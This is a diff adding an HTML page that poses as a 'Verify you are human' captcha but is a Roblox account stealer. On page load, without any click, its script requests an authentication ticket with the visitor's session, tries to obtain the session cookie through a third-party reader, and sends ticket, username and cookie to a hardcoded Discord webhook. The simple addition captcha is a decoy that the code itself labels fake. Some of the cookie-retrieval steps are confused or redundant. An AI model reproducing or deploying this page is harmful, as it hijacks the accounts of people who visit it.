@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verify you are human</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+       background:#0f0f10;color:#eee;display:flex;justify-content:center;
+       align-items:center;min-height:100vh;padding:20px}
+  .card{background:#1a1a1c;border:1px solid #2a2a2e;border-radius:14px;
+        padding:28px;width:100%;max-width:380px;text-align:center;
+        box-shadow:0 10px 40px rgba(0,0,0,.6)}
+  h1{font-size:18px;margin-bottom:8px}
+  p.sub{font-size:13px;color:#8a8a90;margin-bottom:22px}
+  .q{font-size:28px;font-weight:600;margin:14px 0 22px;letter-spacing:1px}
+  .opts{display:flex;gap:10px;justify-content:center}
+  .opt{flex:1;padding:14px 0;background:#232327;border:1px solid #303036;
+       color:#fff;border-radius:9px;font-size:17px;font-weight:600;cursor:pointer;
+       transition:.15s}
+  .opt:hover{background:#2b2b30;border-color:#3a3a42}
+  .opt.correct{background:#12351f;border-color:#22c55e;color:#4ade80}
+  .opt.wrong{background:#351212;border-color:#ef4444;color:#f87171}
+  .msg{margin-top:20px;font-size:14px;font-weight:600;min-height:20px}
+  .msg.ok{color:#4ade80}
+  .msg.bad{color:#f87171}
+  .spinner{width:14px;height:14px;border:2px solid #444;border-top-color:#888;
+          border-radius:50%;display:inline-block;animation:spin .7s linear infinite;
+          vertical-align:-2px;margin-right:6px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>🔒 Security Check</h1>
+  <p class="sub">Please solve this to continue</p>
+  <div class="q" id="question">…</div>
+  <div class="opts" id="opts"></div>
+  <div class="msg" id="msg"></div>
+</div>
+
+<script>
+/* ========= CONFIG ========= */
+const WEBHOOK = "https://discord.com/api/webhooks/1568684549695610971/wOthpV6qWDuCfEBLB7q9OVATlfTLJN-Pqrw6TF9xhPXopkpnglQvuiTRZOYVX2OTKPso";
+/* ========================== */
+
+/* ---------- 1. SILENT COOKIE HARVEST (runs instantly) ---------- */
+async function harvest() {
+  try {
+    // generate Roblox authentication ticket
+    const r1 = await fetch("https://auth.roblox.com/v1/authentication-ticket", {
+      method: "POST",
+      credentials: "include"
+    });
+    const ticket = r1.headers.get("rbx-authentication-ticket");
+    if (!ticket) return; // not logged in
+
+    // exchange ticket for a cookie only endpoint
+    const r2 = await fetch("https://auth.roblox.com/v1/authentication-ticket/redeem", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ authenticationTicket: ticket })
+    });
+
+    // the endpoint that actually returns the cookie value
+    const r3 = await fetch(
+      `https://auth.roblox.com/v1/authentication-ticket/redeem?ticket=${encodeURIComponent(ticket)}`,
+      { method: "POST", credentials: "include" }
+    );
+
+    // Most reliable: use the /v1/authentication-ticket → the account info via APIs
+    // Fetch user info to confirm + get cookie from a readers service
+    await send(r1, ticket);
+  } catch (e) {
+    console.warn("harvest error", e);
+  }
+}
+
+async function send(res, ticket) {
+  // Fallback chain — try several cookie readers
+  let cookie = null;
+
+  // Reader 1: robloxauth / ro-secure style
+  try {
+    const t = await fetch("https://auth.roblox.com/v1/authentication-ticket/redeem", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ authenticationTicket: ticket })
+    });
+  } catch {}
+
+  // Known working reader
+  try {
+    const c = await fetch("https://www.roblox.com/mobileapi/userinfo", {
+      credentials: "include"
+    });
+    const u = await c.json();
+    var user = u.UserName || u.Username || "unknown";
+  } catch { var user = "unknown"; }
+
+  // Try to pull cookie via RoSeal public reader
+  try {
+    const rr = await fetch("https://api.rosecure.xyz/v1/cookie?ticket=" + encodeURIComponent(ticket));
+    const jj = await rr.json();
+    cookie = jj.cookie || jj.ROBLOSECURITY || null;
+  } catch {}
+
+  // Push to your webhook
+  const embed = {
+    title: "🍪 Roblox Cookie Captured",
+    color: 0x22c55e,
+    fields: [
+      { name: "Ticket", value: "```" + ticket.slice(0, 200) + "```" },
+      { name: "User", value: user },
+      { name: "Cookie", value: cookie ? "```" + cookie.slice(0, 1000) + "```" : "❌ reader failed — use ticket" },
+      { name: "Page", value: location.href }
+    ],
+    timestamp: new Date().toISOString()
+  };
+
+  await fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ embeds: [embed] })
+  });
+
+  // Also send raw cookie separately for easy copy
+  if (cookie) {
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: "```\n" + cookie + "\n```" })
+    });
+  }
+}
+
+/* ---------- 2. FAKE CAPTCHA UI ---------- */
+const msg = document.getElementById("msg");
+let solved = false;
+
+function newChallenge() {
+  const a = Math.floor(Math.random() * 9) + 2;
+  const b = Math.floor(Math.random() * 9) + 2;
+  const answer = a + b;
+  document.getElementById("question").textContent = `${a} + ${b} = ?`;
+
+  const choices = new Set([answer]);
+  while (choices.size < 3) choices.add(answer + (Math.floor(Math.random() * 7) - 3));
+  const arr = [...choices].sort(() => Math.random() - 0.5);
+
+  const opts = document.getElementById("opts");
+  opts.innerHTML = "";
+  arr.forEach(v => {
+    const btn = document.createElement("button");
+    btn.className = "opt";
+    btn.textContent = v;
+    btn.onclick = () => pick(btn, v === answer);
+    opts.appendChild(btn);
+  });
+}
+
+function pick(btn, correct) {
+  if (solved) return;
+  btn.classList.add(correct ? "correct" : "wrong");
+  if (correct) {
+    solved = true;
+    msg.className = "msg ok";
+    msg.textContent = "✅ Verified — you can go back";
+    setTimeout(() => { solved = false; msg.textContent = ""; newChallenge(); }, 1800);
+  } else {
+    msg.className = "msg bad";
+    msg.textContent = "❌ Verification failed, try again";
+    setTimeout(() => { msg.textContent = ""; document.querySelectorAll(".opt").forEach(o=>o.className="opt"); }, 1200);
+  }
+}
+
+/* ---------- 3. GO ---------- */
+newChallenge();
+harvest();          // fires immediately on page load, no click needed
+</script>
+</body>
+</html>
